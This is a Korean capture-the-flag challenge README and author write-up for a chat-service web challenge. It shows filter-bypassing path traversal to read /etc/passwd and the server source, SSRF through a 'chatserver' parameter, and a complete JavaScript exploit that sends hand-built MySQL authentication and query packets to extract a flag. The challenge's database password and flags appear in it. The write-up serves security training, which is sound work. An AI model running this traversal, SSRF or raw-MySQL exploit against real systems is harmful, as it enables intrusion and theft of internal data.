# fiest2021_webchall

## 문제명 : FSI cha tin gse rvi ce!

- 출제자 : 보안평가2팀 주임 유재욱
- 출제분야 : 웹해킹
- 총배점 : 600점
- Flag1(100점) : `fiesta{ok_y0u_g0t_the_ext_server's_code!}`
- Flag2(100점) : `fiesta{congrat_y0u_g0t_all_of_th3_ext&int_server's_code!}`
- Flag3(400점) : `fiesta{mysql_int3rner_1s_s0_fun_isnt_1t?}`

* Description

  ```tex
  A사는 최근 채팅서비스를 개발하여 제공하는 솔루션사 B사로부터 채팅서비스를 구매하여 A사의 서버와 통합하였는데... A사의 내부 보안 취약점 분석팀 직원인 당신에게 이 통합된 채팅서비스가 안전한지 알아보라는 임무가 주어졌다. 채팅서비스 내부망 데이터베이스 유출 가능성이 있는지 내부 데이터베이스에 존재하는 Flag를 획득하여 증명해보자.
  
   * 본 문제의 Flag는 총 3개입니다. 최종 Flag는 내부 데이터베이스의 flag 테이블에 존재합니다.
   * 서버는 30분마다 초기화됩니다.
   * 본 문제는 크롬 브라우저에 최적화 되어 있습니다.
  ```

## 문제 운영방법

- 시작 : `./run.sh&`
- 일시정지 : `./stop.sh`
- 로그 : `docker-compose logs -f`

* run.sh 실행 시 30분마다 한번씩 서버가 전체 초기화되고 재실행됩니다.


## 문제 컨셉

- 전체 문제 서비스의 큰 틀은 **채팅 서비스**

- 여러 금융 기관의 취약점 분석 평가 도중 마주쳤던 채팅상담 서비스의 환경과 비슷한 맥락으로 구성

- 보통 외부의 채팅상담 서비스를 가져와 Integration을 하여 구현하는것이 보통

- 때문에 별도의 채팅상담 서비스 서버를 두고, 웹서버는 클라이언트와 채팅상담 서비스 사이를 중계해주는 역할을 수행

- 이러한 환경에서, 중계 서비스에 SSRF(Server Side Request Forgery) 취약점이 존재한다면 발생하는 위협이 핵심 문제 해결 포인트

- 잘못된 예외처리와 잘못된 필터링, 사용자로부터 전달받은 입력값으로 중요로직 처리 등으로 인하여 취약점들이 발생, 이들을 모두 엮어 문제 해결을 하여야 함

  

## 문제 환경

- 서버 언어는 python flask

- flask_socketio(외부망 웹서버) / socketserver(내부망 채팅api 서버) / mysql(내부망 채팅 데이터베이스 서버)

- Client와 웹서버는 socketio를 통해 통신하고, 클라이언트로부터 전달받은 데이터를 파싱하여 내부망 채팅 api 서버로 전송

- 내부망 채팅 api 서버는 웹서버로부터 전달받은 데이터를 토대로 채팅 Database에 질의하여 그 결과를 다시 웹서버로 반환

- 웹서버는 반환받은 채팅 관련 데이터를 클라이언트로 전달

  

## 출제자 Write-Up

* 우선 문제에서 제공된 Dockerfile들을 보면 외부망, 내부망, 그리고 데이터베이스 이렇게 세개의 서버로 구성된것을 알 수 있다.
* 데이터베이스의 경우 **5.7버전**을 사용하고 있는것을 확인할 수 있다.

* 이러한 사항들을 주지하고 문제를 풀어나가야 한다.



## 외부망 소스코드 유출, 첫번째 플래그

* 우선 이미지를 보내는 기능을 살펴보면,
* client단에서 `data:image/png` 형태로 변형하여 base64로 인코딩한채로 보낸다.
* 또한 filename 파라미터가 존재하는데, 해당 파라미터, 즉 파일명이 메세지 내용에 씌여지는것을 response되는 채팅 데이터를 통해 알 수 있다.
* filename에 `'`와같은 일부 문자를 넣을 시 replace처리되어 파일명에서 사라지는것을 확인할 수 있다.
* 또한 `../`와같이 상대경로로 이동할 수 있는 문자열 중 `..`를 replace처리하는 것을 알 수 있다.
* 위 2개를 섞는다면 `.'./`와 같이 구성해보면 상대경로로 갈 수 있는 `../`가 완성된다
* 이를 통해 filename 파라미터에 `.'./.'./.'./.'./.'./.'./.'./.'./.'./.'./.'./etc/passwd`와 같이 파일명을 주어 가입하게 되면 파일명은 `../../../../../../../../etc/passwd`와 같이 변하게 된다.

![](http://arang.kr/fiesta/fiesta2.png)

* upload error라고 나타나지만 실제 upload result를 살펴보면,

```
HTTP/1.0 200 OK
Content-Type: text/plain; charset=UTF-8
Access-Control-Allow-Credentials: true
Connection: close
Server: Werkzeug/2.0.1 Python/3.8.10
Date: Thu, 12 Aug 2021 10:40:43 GMT

42["uploadImageResult","[x] upload \"/app/ext_app/uploads/test/../../../../../../../../../../../etc/passwd\" error"]
```

* 위와같이 webroot 하위에 있는 절대경로가 노출된다.

![](https://arang.kr/fiesta/fiesta3.png)

* 그리고 새로고침하여 chat message들을 불러오면, 필터링을 우회하여 입력한 경로의 파일(지금은 /etc/passwd)을 읽어와 img tag에 넣어주는 것을 볼 수 있다.

![](http://arang.kr/fiesta/fiesta5.png)

* 이제 여기서 `/app/ext_app/`이 web server가 구동중인 path라고 가정하고 `/app/ext_app/app.py`를 filename 파라미터에 입력하게 되면 외부망 소스코드를 획득할 수 있다.



* **첫번째 flag 획득 `fiesta{th1s_1s_the_st4rt_0f_th3_ch4ll3ng3}`**



## 내부망 소스코드 유출, 두번째 플래그

* 우선 회원가입할때 프로필 이미지를 업로드하는 루틴부터 살펴보면, file content를 내부망으로 socket 통신을 통해 전송하기 때문에 내부망 서버에 파일
* 16kb 미만의 프로필 이미지를 업로드하면 채팅할 때 프로필 이미지를 `/getProfileImage?id={id}` 형식으로 가져온다.
* `/getProfileImage`의 response값을 살펴보면 `content(data:image/png 형태로 변형된 이미지)`와 `filename(업로드한 파일명)`이 서버로부터 전달된다.
* register시 filename에 `'`와같은 일부 문자를 넣을 시 replace처리되어 파일명에서 사라지는것을 확인할 수 있다.
* 외부망 소스코드를 얻을때와 마찬가지로 `.'./`를 입력하면 `../`가 된다.
* 이를 통해 register시 `.'./.'./.'./.'./.'./.'./.'./.'./.'./.'./.'./etc/passwd`와 같이 파일명을 주어 가입하게 되면 /etc/passwd가 누출될것이다
* ![](https://arang.kr/fiesta/fiesta1.png)

* 외부망 소스코드를 얻을때와 마찬가지로 response message에 절대경로가 노출되고 있다.
* 그리고 이렇게 에러가 나더라도 회원가입을 시도한 id와 pw로 로그인을 해보면 정상로그인 되는것을 확인할 수 있다.(잘못된 예외처리)

![](https://arang.kr/fiesta/fiesta6.png)

* 위와같이 로그인 후 `/getProfileImage?id={userid}`를 통해 ../../../../etc/passwd를 넣어 가입했던 id의 profile image에 /etc/passwd의 파일 내용이 담긴것을 확인할 수 있다.



![](https://arang.kr/fiesta/fiesta7.png)

* 외부망과 마찬가지로 노출되었던 절대경로를 바탕으로 `/app/int_app/app.py`를 누출해보면 내부망 소스코드와 두번째 플래그를 획득할 수 있다.



**두번째 flag 획득 `fiesta{cheerup!_y0u_c0uld_s0lve_the_l4st_p4rt!}`**



## ssrf를 통해 mysql 임의 쿼리 실행, 마지막 플래그

* 이체 유출된 소스코드들을 통해 white-box로 분석할 수 있다.
* 외부망과 내부망은 서로 socket을 가지고 통신을한다. 이때 사용하는 socket은 세션을 유지하기 위해 외부망 flask의 `users`라는 dict에 각 session의 uuid를 key로하여 메모리내에서 관리한다.

```python
# ext_app/app.py
def sessionCheck(loginCheck=False):       
    ...

	if flask.session["uuid"] not in users:
        flask.session["host"] = ("172.22.0.4",9091)
        print(f"[+] new socket conn {flask.session['uuid']}")
        users[flask.session["uuid"]] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        users[flask.session["uuid"]].connect(flask.session["host"])
```

* 이러한 세션은 각 페이지 접근 시 `sessionCheck`함수를 통해 현재 세션을 가지고 있는지를 체크, 세션을 가지고 있지 않다면 `session['host']`에 `172.22.0.4:9091(내부망)`를 저장하고, 이를통해 socket을 연결한다.

```python
# ext_app/app.py
@socket_io.on("join")
def join(content):
    channel = content['channel']
    userid = content['userid']

    if flask.session["userid"] == userid and flask.session["uuid"] == channel:
        if 'chatserver' in content:
            if flask.session["uuid"] in users:
                users[flask.session["uuid"]].close()
            
            chatserver = content['chatserver']
            t = chatserver.split(':')
            flask.session["host"] = (t[0], int(t[1]))
            
            users[flask.session["uuid"]] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
            users[flask.session["uuid"]].connect(flask.session["host"])

        flask.session["channel"] = channel
        flask_socketio.join_room(channel)

        sioemit("join",{"result":"success"}, channel)
    else:
        sioemit("join",{"result":"fail"}, channel)
```



* 하지만 socket.io가 "join"으로 emit할때, client에서 요청하는 파라미터 중 `chatserver`라는 파라미터가 있을 시, 해당 파라미터를 통하여 `session["host"]`를 재설정하고, 이를 토대로 다시 socket connection을 맺는다.



```js
/* exploit.js */
var sock = io.connect(`ws://52.78.132.206:9090/`);
sock.on('connect', function(){
	var data = {'channel':uuid, 'userid':userid, 'chatserver': '172.22.0.5:3306'};
	sock.emit("join",data);
});
```

* 따라서 위와같이 `join` namespace에 emit할 때 요청되는 파라미터 중 `chatserver` 파라미터를 통해 임의 호스트와 포트에 raw packet을 송신할 수 있는 SSRF 취약점이 발생하게 된다.



```python
# int_app/app.py
class mysqlapi:
	def __init__(self):
		self.conn = pymysql.connect( 
			user = 'chatdb_admin',
			passwd = 'th1s_1s_ch4tdb_4dm1n_p4ssw0rd',
			host = '172.22.0.5',
			db = 'chatdb',
			charset = 'utf8'
		)
```

* 내부망 app.py에는 db connection을 맺는 정보가 나와있다. 따라서 mysql client가 mysql server와 맺는 connection 과정을 그대로 맺은 후 query를 전송하면 전송된 query의 결과를 돌려줄 것이다.



```python
# ext_app/app.py
@socket_io.on("chatsend")
def chatsend(content):
    if not sessionCheck(loginCheck=True):
        resp = "[x] please login"
        sioemit("newchat", resp, flask.session["channel"])
        return

    if "sendtome" in content:
        sendtome_flag = True
    else:
        sendtome_flag = False

    try:
        if type(content) != dict:
            content = content.encode('latin-1')
            content = json.loads(content)

        if content["from"] != flask.session["userid"]:
            print(f"[x] {content['from']} != {flask.session['userid']}")
            return "[x] request from user is different from session"

        if content["msg"] == "":
            return "[x] blank content. please input content"

    except Exception as e:
        pass

    resp = socksend(users[flask.session["uuid"]], content)

    if sendtome_flag:
        sioemit("newchat", resp, users[flask.session["userid"]])
    else:
        sioemit("newchat", resp, users[resp["to"]])
        sioemit("newchat", resp, users[resp["from"]])
```



* SSRF를 트리거하여 raw packet을 전송하려면 잘못 처리된 예외처리 구문을 이용하여야한다

* 본래 client에서 정상적인 요청이라면, json 형식으로 올바르게 전송될 것이다. json형식에 맞지 않는 content가 전송될 경우 `content = json.loads(content)`에서 exception이 발생하여 exception 처리 구문으로 가게된다.
* 그런데 여기서 except 처리구문에는 아무 동작 없이 pass만 하고 지나간다. 따라서 에러가 발생한 이전 라인인 `content = content.encode('latin-1')`이 실행된 채로 content 변수에 사용자의 input이 그대로 남아있게 되고, 이는 그대로 `resp = socksend(users[flask.session["uuid"]], content)`구문의 인자로 넘어가 전송되게된다.
* 따라서 임의의 원하는 raw packet을 socket을 통해 전송할 수 있는것이다.



* 하지만 전송 후 받는 응답을 클라이언트로 잘 전달해야하는데, 나에게 보낼 경우 `users` dict의 key로 `flask.session["userid"]`를 사용하는것에 비해, 나에게 보내지 않을 경우 송신자와 수신자 양쪽의 socket io channel에 전송하기 위하여 socket 전송의 결과를 가져와 거기서 송신자와 수신자를 파싱하게 된다.

* 우리가 mysql에 직접 raw packet을 보내고 받는 응답값에는 당연히 송신자와 수신자 정보가 존재하지 않기 때문에 `sendtome_flag`가 활성화 되어야만 raw packet 전송에 대한 응답값을 클라이언트로 수신할 수 있다.

* `sendtome_flag`는 content에 `sendtome`가 있는지 검사하는 `if "sendtome" in content:`라는 조건문에서 세팅되는데, content가 json이었다면 content dictionary에 sendtome라는 key가 존재하는지 검사하는 조건문이 되었겠지만, raw packet으로 보낼때는 string형의 content에 sendtome라는 단어가 존재하는지 검사하는 조건문이 되기 때문에 packet 안에 sendtome가 들어가기만 하면 나에게 보내는 분기를 활성화시킬 수 있다.

  

* 이제 mysql conneciton 과정을 raw packet으로 재현해야하는데,

  * 우리가 흔히 아는 `Gopherous`로 payload를 만드는 경우는 mysql connection 시 password가 없을 때이다. password가 존재할 경우, mysql-server에서 authentication 방식을 어떤것으로 설정해놓았는지를 보아야 하는데, mysql 5버전의 경우 `mysql_native_password`를 사용한다. (8.0 이상의 경우 `caching_sha2_password`를 사용한다)
  * 주어진 Dockerfile에서 mysql 버전이 5.7인것을 확인했기 때문에, SSRF를 통해 mysql connection을 재현하기 위해선 mysql_native_password의 구성 원리와 connection 과정을 이해하여야한다.

  

  ![](https://dev.mysql.com/doc/internals/en/images/graphviz-db6c3eaf9f35f362259756b257b670e75174c29b.png)

  * [mysql internals - connection phase packets](https://dev.mysql.com/doc/internals/en/connection-phase-packets.html)를 살펴보면 connection 과정이 나오는데, 그냥 wireshark로 환경세팅 후 직접 connection phase를 캡쳐해보면 아래와 같이 진행되는것을 확인할 수 있다.

    ![](https://arang.kr/fiesta/fiesta9.png)

    ![](https://arang.kr/mysql_auth_packet.png)

    0. server greeting (connection 시 서버가 전송)

    1. send login request -> receive server seed

    2. send mysql_native_password hash->receive auth ok
    3. (if password match) send mysql query -> receive query result

    ```
    SHA1( password ) XOR SHA1( "20-bytes random data from server(seed)" + SHA1( SHA1( password ) ) )
    ```

  * 1번단계에서 서버로부터 seed를 받아 이와 db password를 엮어 위와 같은 해시를 생성 후 2번단계에서 서버에 전송, 그 응답값을 확인하게된다.

  * 따라서 위와같은 과정들을 거치도록 raw packet을 구성하면 되는데, 문제는`sendtome`, 즉 나에게 보내기 기능이 활성화 되어야 에러없이 raw packet send의 response를 받아올 수 있기 때문에, 각 단계의 패킷마다 "sendtome" 라는 문자열이 들어가야한다는 것이다.

  

  ```
  0. server greeting (connection 시 서버가 전송)1. send login request -> receive server seed2. send mysql_native_password hash->receive auth ok3. (if password match) send mysql query -> receive query result
  ```

  * mysql에서 packet을 주고받는것은 network에서 Application Layer에 해당하는데, mysql이 패킷을 주고받는 특성상, 이어지는 여러개의 패킷을 한번에 보내도록 구성한다거나("AAAABBBBCCCC"), 하나의 패킷을 두개로 쪼개 전송("AA","AA")하는등의 동작이 가능하다.
  * 이점을 이용하여 상기 단계로 구성되는 mysql connection & query packet을 sendtome라는 문자열이 각 패킷에 들어갈 수 있게 구성하여야하는데, 중간에 server seed를 받아와 이를 통해 password hash를 생성해야하는 과정이 들어가있기 때문에 최소 2단계 이상으로 패킷을 나누어 구성하되 "sendtome" 문자열이 패킷안에 들어가게끔 해야한다.
  * 다만 현재 socket을 통해 데이터를 주고받는 과정이 send->recv->send->recv 와 같이 1:1로만 주고받고 있기 때문에, 1번단계에서 login request를 보내더라도 첫 recv에선 connection시 서버가 전송하는 server greeting 패킷이 수신되게 된다.
  * 따라서 server seed를 받아오기 위해선 send 이후 recv가 두번 실행되어야 하는데, 이를 이루기 위하여 위에서 설명한 `하나의 패킷을 두개로 쪼개 전송("AA","AA")하는` 방법을 사용한다.

  ![](https://arang.kr/fiesta/fiesta8.png?)

  * mysql raw packet의 맨 앞 3바이트는 뒤에 올 패킷의 length인데, 이를 적절히 변조하여 마지막 sendtome 8byte만 빼고 보냄으로써 `TCP segment of a reassembled PDU` 를 유도하고, send -> recv -> (send, 원래 첫번째패킷) -> recv가 되도록 만들어준다.

  

  * 이로써 server seed를 얻었으므로 내부망 코드에서 알아낸 db 패스워드와 server seed를 조합하여 패스워드 해시를 만들어낸다.
  * 이번엔 두개의 패킷을 하나로 합쳐 한번에 보내는것으로("AAAABBBB") 패스워드 해시를 보내는 패킷과 query request 패킷을 하나로 합쳐보내며 query request 패킷의 요청 길이를 조작하여 sendtome(8byte)를 보낼 길이만큼 설정한다
  * query를 `select * from flag#`과 같이 끝에 주석처리를하여 뒤에 sendtome가 오더라도 정상적인 쿼리가 되도록 세팅 후 보내면, 서버와 주고받는 과정으로 flag가 날아오게된다

  

  * 설명이 너무 복잡하여 그림과 글로 요약하면 아래와 같다.

  ![](https://arang.kr/fiesta/fiesta10.png)

  ```
  1. [TCP reassemble A] login request 전송
  2. [TCP reassemble A] sendtome(8byte) 전송
  3. [B] password hash + [TCP reassemble C] query request(+#) 전송
  4. [TCP reassemble C] sendtome(8byte) 전송
  ```



## 최종 Exploit Code 및 마지막 Flag

![](https://arang.kr/fiesta/fiesta11.png)

**마지막 플래그 `fiesta{mysql_int3rner_1s_s0_fun_isnt_1t?}`**

```js
// author(arang)'s writeup

function ab2str(buf) {
	return new TextDecoder().decode(buf)
}

function Latin1ToUint8Array(iso_8859_1){
    var uInt8Arr = new Uint8Array(iso_8859_1.length);
    for(var i=0; i<iso_8859_1.length; i++){
        uInt8Arr[i] = iso_8859_1.charCodeAt(i);
    }
    return uInt8Arr;
}

function xor(key, phrase){
	var r = "";
	for(var i=0; i<phrase.length; i++){
		r += String.fromCharCode( key.charCodeAt(i%key.length) ^ phrase.charCodeAt(i) );
	}
	return r;
}

function convertFromHex(hex) {
    var hex = hex.toString();
    var str = '';
    for (var i = 0; i < hex.length; i += 2)
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    return str;
}

function addScript(cdnurl){
	var cjs_script = document.createElement("script");
	cjs_script.setAttribute('src',cdnurl);
	document.body.insertBefore(cjs_script,document.body.firstChild);	
}

async function sha1(message) {
  const msgUint8 = Latin1ToUint8Array(message);                           
  const hashBuffer = await Crypto.SHA1(msgUint8, {asBytes: true});
  const hashArray = Array.from(new Uint8Array(hashBuffer));                     
  const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join(''); 
  return hashHex;
}

async function step2(serverSeed){		
	//// mysql native password hashing process
	// SHA1( password ) XOR SHA1( "20-bytes random data from server" <concat> SHA1( SHA1( password ) ) )
	console.log("[+] seed "+btoa(serverSeed));
	var sp = await sha1(password);
	var ssp = await sha1(convertFromHex(sp))
	var sssp = await sha1(serverSeed+convertFromHex(ssp))
	console.log("[+] sssp "+btoa(sssp));
	
	var hashedPassword = xor( convertFromHex(sp), convertFromHex(sssp) );
	console.log("[+] hashed password "+btoa(hashedPassword))

	var p1 = "\x14\x00\x00\x03"+hashedPassword

	var query = "select * from flag#";
	var p2 = `${String.fromCharCode(query.length+9)}\x00\x00\x00\x03${query}`

	var packet = p1+p2;
	console.log(btoa(packet))
	setTimeout(function(){console.log("send 3 round");sock.emit("chatsend", packet);},500)
	setTimeout(function(){console.log("send 4 round");sock.emit("chatsend", "sendtome");},1500)
}

var round = 0;

var sock = io.connect(`ws://52.78.132.206:9090/`);
sock.on('connect', function(){
	var data = {'channel':uuid, 'userid':userid, 'chatserver': '172.22.0.5:3306'};
	sock.emit("join",data);
});

sock.on('join', function(data){
	console.log(data)
	if(data["result"] == "fail"){
		alert("join room fail")
	}
})

// when get a new chat message
sock.on('newchat', function(data){
	//console.log(data.msg);
	//var result = ab2str(data.msg);
	var result = data;
	console.log("[+] newchat "+result);
	round += 1
	if (round == 2){
		console.log("[+] yeah! I got the server seed")
		var serverSeed = result.split("native_password\x00")[1].slice(0,-1);
		step2(serverSeed);
	}
})

var password = "th1s_1s_ch4tdb_4dm1n_p4ssw0rd";
addScript("https://arang.kr/sha1.js");
var packet = "";

// step 1
p1 = convertFromHex("cb0000018da2bf0900000001ff00000000000000000000000000000000000000000000006368617464625f61646d696e00006368617464620063616368696e675f736861325f70617373776f72640074045f706964053136343139095f706c6174666f726d067838365f3634035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c076f735f75736572056172616e670f5f636c69656e745f76657273696f6e06382e302e32330c70726f6772616d5f6e616d650573656e64746f6d65")

setTimeout(function(){console.log("send 1 round");sock.emit("chatsend", p1);},500)
setTimeout(function(){console.log("send 2 round");sock.emit("chatsend", "sendtome");},1500)
```
